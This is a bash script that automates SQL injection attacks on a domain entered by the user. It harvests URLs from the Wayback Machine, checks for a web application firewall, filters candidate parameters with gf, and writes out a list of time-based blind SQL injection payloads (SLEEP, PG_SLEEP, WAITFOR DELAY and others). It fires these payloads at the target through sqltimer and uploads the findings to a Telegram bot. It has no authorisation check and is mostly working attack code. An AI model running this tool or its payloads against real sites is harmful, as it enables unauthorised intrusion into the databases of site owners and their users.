#!/bin/bash

# Colors
MAGENTA='\033[1;35m'
NC='\033[0m' # No Color
BLUE='\033[1;34m'
GREEN='\033[1;32m'
RED='\033[1;31m'
YELLOW='\033[1;33m'

# Progress bar configuration
BAR_WIDTH=50
BAR_CHAR_DONE="#"
BAR_CHAR_TODO="-"
BRACKET_DONE="["
BRACKET_TODO="]"

# Progress bar function
display_progress() {
    local current=$1
    local total=$2
    local title=$3
    local percent=$((current * 100 / total))
    local done=$((percent * BAR_WIDTH / 100))
    local todo=$((BAR_WIDTH - done))

    printf "\r${YELLOW}[*] %s: ${BRACKET_DONE}" "${title}"
    printf "%${done}s" | tr " " "${BAR_CHAR_DONE}"
    printf "%${todo}s${BRACKET_TODO} %3d%%" | tr " " "${BAR_CHAR_TODO}"
    echo -en " ($current/$total)${NC}"
}

# Banner function
display_banner() {
    clear
}

# Input target function
input_target() {
    clear
    echo -e "${BLUE}👽 Single Domain SQL Injection${NC}"
    echo ""
    
    while true; do
        echo -e "${YELLOW}[?] Enter target domain ${NC}(example: example.com)"
        echo -e "${YELLOW}[?] Type 'quit' to exit${NC}"
        echo -ne "\n${GREEN}[+] Target domain: ${NC}"
        read -r input
        
        # Validation logic
        if [[ -z "$input" ]]; then
            echo -e "\n${RED}[!] Error: workspace cannot be empty!${NC}"
            sleep 1
            continue
        elif [[ "$input" == "quit" ]]; then
            echo -e "\n${YELLOW}[!] Exiting program...${NC}"
            exit 0
        elif ! [[ "$input" =~ ^[a-zA-Z0-9][a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
            echo -e "\n${RED}[!] Error: Invalid workspace format!${NC}"
            sleep 1
            continue
        fi
        
        # If valid
        echo -e "\n${GREEN}[✓] Target workspace valid: $input${NC}"
        echo -e "${BLUE}[*] Starting scan...${NC}\n"
        sleep 1
        workspace="$input"  # Set workspace variable
        break
    done
    return 0
}

# Setup workspace
setup_workspace() {
    echo -e "\n${BLUE}[+] Setting up workspace...${NC}"
    mkdir -p "$workspace"/{sources,result/{sqli,wayback,gf}}
    echo -e "${GREEN}[✓] Workspace created${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# WAF detection
check_waf() {
    echo -e "\n${BLUE}[+] Checking Web Application Firewall...${NC}"
    if command -v wafw00f &> /dev/null; then
        wafw00f "$workspace" | tee "$workspace/result/waf_detection.txt"
    else
        echo -e "${YELLOW}[!] wafw00f not found - performing basic WAF check${NC}"
        curl -sI "https://$workspace" | grep -i "WAF" | tee "$workspace/result/waf_detection.txt"
    fi
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Wayback data collection - MODIFIED to focus on main workspace only
collect_wayback() {
    echo -e "\n${BLUE}[+] Collecting URLs from Wayback Machine...${NC}"
    echo -e "${MAGENTA}[*] Focusing only on main workspace: $workspace${NC}"
    
    if command -v waybackurls &> /dev/null; then
        # Collect URLs from wayback machine
        echo "https://$workspace/" | waybackurls | anew "$workspace/result/wayback/wayback-tmp.txt"
        
        echo -e "${MAGENTA}[*] Filtering for main workspace only...${NC}"
        # Filter to include only URLs from the main workspace (no subworkspaces)
        # Remove www. prefix if exists for comparison
        workspace_cleaned=$(echo "$workspace" | sed 's/^www\.//')
        
        cat "$workspace/result/wayback/wayback-tmp.txt" 2>/dev/null | \
            grep -E "^https?://(www\.)?${workspace_cleaned}(/|:|$)" | \
            grep -v -E "^https?://[^/]*\.${workspace_cleaned}" | \
            egrep -v "\.woff|\.ttf|\.svg|\.eot|\.png|\.jpeg|\.jpg|\.png|\.css|\.ico" | \
            sed 's/:80//g;s/:443//g' | sort -u > "$workspace/result/wayback/wayback.txt"
        
        # Additional filter to ensure no subworkspaces
        temp_file=$(mktemp)
        while IFS= read -r url; do
            # Extract hostname from URL
            hostname=$(echo "$url" | sed -E 's|^https?://([^/]+).*|\1|' | sed 's/:.*$//')
            # Check if hostname matches main workspace (with or without www)
            if [[ "$hostname" == "$workspace" ]] || [[ "$hostname" == "www.$workspace" ]] || \
               [[ "$hostname" == "${workspace_cleaned}" ]] || [[ "$hostname" == "www.${workspace_cleaned}" ]]; then
                echo "$url" >> "$temp_file"
            fi
        done < "$workspace/result/wayback/wayback.txt"
        
        mv "$temp_file" "$workspace/result/wayback/wayback.txt"
        
        rm -f "$workspace/result/wayback/wayback-tmp.txt"
        total_urls=$(wc -l < "$workspace/result/wayback/wayback.txt" 2>/dev/null || echo "0")
        echo -e "${GREEN}[✓] Found $total_urls unique URLs from main workspace only${NC}"
        
        # Show sample of collected URLs
        if [[ $total_urls -gt 0 ]]; then
            echo -e "${YELLOW}[*] Sample of collected URLs:${NC}"
            head -5 "$workspace/result/wayback/wayback.txt" | sed 's/^/    /'
            if [[ $total_urls -gt 5 ]]; then
                echo "    ..."
            fi
        fi
    else
        echo -e "${RED}[!] waybackurls not found${NC}"
    fi
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# URL validation
validate_urls() {
    echo -e "\n${BLUE}[+] Validating discovered URLs...${NC}"
    if [[ -f "$workspace/result/wayback/wayback.txt" ]]; then
        ffuf -c -u "FUZZ" -w "$workspace/result/wayback/wayback.txt" -of csv -o "$workspace/result/wayback/valid-tmp.txt" \
             -t 100 -rate 1000
        
        cat "$workspace/result/wayback/valid-tmp.txt" 2>/dev/null | grep http | awk -F "," '{print $1}' > "$workspace/result/wayback/valid.txt"
        rm -f "$workspace/result/wayback/valid-tmp.txt"
        
        valid_count=$(wc -l < "$workspace/result/wayback/valid.txt" 2>/dev/null || echo "0")
        echo -e "${GREEN}[✓] Found $valid_count valid URLs${NC}"
    else
        echo -e "${RED}[!] No URLs found to validate${NC}"
    fi
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# GF pattern matching
run_gf_patterns() {
    echo -e "\n${BLUE}[+] Running GF pattern matching...${NC}"
    
    if ! command -v gf &> /dev/null; then
        echo -e "${RED}[!] gf not found${NC}"
        return 1
    fi
    
    patterns=("sqli" "reflection" "debug_logic" "interestingparams")
    total_patterns=${#patterns[@]}
    current=0
    
    for pattern in "${patterns[@]}"; do
        ((current++))
        echo -e "${MAGENTA}[*] ($current/$total_patterns) Checking for $pattern patterns...${NC}"
        gf "$pattern" "$workspace/result/wayback/valid.txt" 2>/dev/null | tee "$workspace/result/gf/${pattern}.txt"
        count=$(wc -l < "$workspace/result/gf/${pattern}.txt" 2>/dev/null || echo "0")
        echo -e "${GREEN}[✓] Found $count potential $pattern endpoints${NC}"
    done
    
    echo -e "${GREEN}[✓] Pattern matching completed${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# SQL injection testing
test_sqli() {
    echo -e "\n${BLUE}[+] Testing for SQL injection vulnerabilities...${NC}"
    
    # Check if sqltimer is installed
    if ! command -v sqltimer &> /dev/null; then
        echo -e "${RED}[!] sqltimer not found. Please install it first.${NC}"
        echo -e "${YELLOW}[*] You can install it with: go install github.com/c0dejump/sqltimer@latest${NC}"
        return 1
    fi
    
    # Check if SQL injection patterns file exists
    if [[ ! -f "$workspace/result/gf/sqli.txt" ]] || [[ ! -s "$workspace/result/gf/sqli.txt" ]]; then
        echo -e "${RED}[!] No SQL injection patterns found to test${NC}"
        return 1
    fi
    
    # Check for payloads file
    payloads_file="payloads.txt"
    if [[ ! -f "$payloads_file" ]]; then
        echo -e "${YELLOW}[!] Payloads file not found at $payloads_file${NC}"
        echo -e "${BLUE}[*] Creating basic payloads file...${NC}"
        cat > "$payloads_file" << 'EOF'
1') AND SLEEP({SLEEP}) AND ('1'='1
(select*from(select(sleep({SLEEP})))a)
(SELECT*SLEEP({SLEEP}))
SLEEP({SLEEP})
1337ANDSLEEP({SLEEP})
'AND(CASEWHEN(SUBSTRING(version(),1,1)='P')THEN(SELECT4564FROMPG_SLEEP({SLEEP}))ELSE4564END)=4564--
';WAITFORDELAY'00:00:{SLEEP}'--
';IF(1=1)WAITFORDELAY'00:00:{SLEEP}'--
'||DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP})--
'XOR(IF(NOW()=SYSDATE(),SLEEP({SLEEP}),0))XOR'Z
'OR1=(SELECTCASEWHEN(1=1)THENPG_SLEEP({SLEEP})ELSENULLEND)--
EOF
    fi
    
    # Count total URLs to test
    total_urls=$(wc -l < "$workspace/result/gf/sqli.txt")
    echo -e "${MAGENTA}[*] Testing $total_urls potential SQL injection endpoints...${NC}"
    
    # Run SQL injection testing
    cat "$workspace/result/gf/sqli.txt" | sqltimer -payloads "$payloads_file" -sleep 10 -threads 20 -encode 2>/dev/null | tee "$workspace/result/sqli/vulnerable.txt"
    
    # Check results
    if [[ -f "$workspace/result/sqli/vulnerable.txt" ]]; then
        vuln_count=$(grep -c "VULNERABLE" "$workspace/result/sqli/vulnerable.txt" 2>/dev/null || echo "0")
        if [[ $vuln_count -gt 0 ]]; then
            echo -e "${RED}[!] Found $vuln_count potential SQL injection vulnerabilities!${NC}"
        else
            echo -e "${GREEN}[✓] No SQL injection vulnerabilities detected${NC}"
        fi
    else
        echo -e "${YELLOW}[!] No results generated${NC}"
    fi
    
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Send results to Telegram
send_to_telegram() {
    echo -e "\n${BLUE}[+] Preparing to send results to Telegram...${NC}"
    if ! command -v curl &> /dev/null || ! command -v zip &> /dev/null; then
        echo -e "${RED}[!] 'curl' and 'zip' are required but not installed.${NC}"
        return 1
    fi

    if [[ ! -f "telegram_token.txt" || ! -f "telegram_chat_id.txt" ]]; then
        echo -e "${RED}[!] Telegram credentials (telegram_token.txt, telegram_chat_id.txt) not found.${NC}"
        return 1
    fi

    local token=$(<"telegram_token.txt")
    local chat_id=$(<"telegram_chat_id.txt")
    local result_dir="$workspace/result"

    local message
    message=$(printf "🔍 *SQL Injection Scan Completed for:* \`%s\`\n\n" "$workspace"
    printf "📊 *Summary:*\n"
    printf " • Total URLs: \`%s\`\n" "$(wc -l < "$result_dir/wayback/wayback.txt" 2>/dev/null || echo 0)"
    printf " • Valid URLs: \`%s\`\n" "$(wc -l < "$result_dir/wayback/valid.txt" 2>/dev/null || echo 0)"
    printf " • Potential SQL Injection: \`%s\`\n\n" "$(wc -l < "$workspace/result/sqli/vulnerable.txt" 2>/dev/null || echo 0)"
    printf "📤 Detailed results are attached in the zip file."
    )

    # Send summary message
    echo -e "${BLUE}[*] Sending summary message...${NC}"
    curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" \
        -d chat_id="$chat_id" \
        -d text="$message" \
        -d parse_mode="Markdown" > /dev/null

    # 3. Archive Results and Send
    if [ -d "$result_dir" ] && [ "$(ls -A "$result_dir")" ]; then
        local archive_name="results-$(basename "$workspace")-$(date +%F).zip"
        
        echo -e "${BLUE}[*] Creating results archive: ${archive_name}${NC}"
        # Option -j (junk paths) keeps files out of subfolders in zip
        zip -r -j "$archive_name" "$result_dir" > /dev/null

        echo -e "${BLUE}[*] Uploading archive...${NC}"
        curl -s -X POST "https://api.telegram.org/bot$token/sendDocument" \
            -F chat_id="$chat_id" \
            -F document=@"$archive_name" \
            -F caption="All scan results for $workspace" > /dev/null
        
        rm "$archive_name" # Remove zip file after sending
    else
        echo -e "${YELLOW}[!] No result files found to archive in '$result_dir'.${NC}"
    fi
    
    echo -e "${GREEN}[✓] Process completed. Results sent to Telegram.${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Main execution
main() {
    display_banner
    input_target
    setup_workspace
    check_waf
    collect_wayback
    validate_urls
    run_gf_patterns
    test_sqli
    send_to_telegram
    echo -e "\n${GREEN}[✓] SQL Injection scan completed successfully!${NC}\n"
}

# Run the script
main
main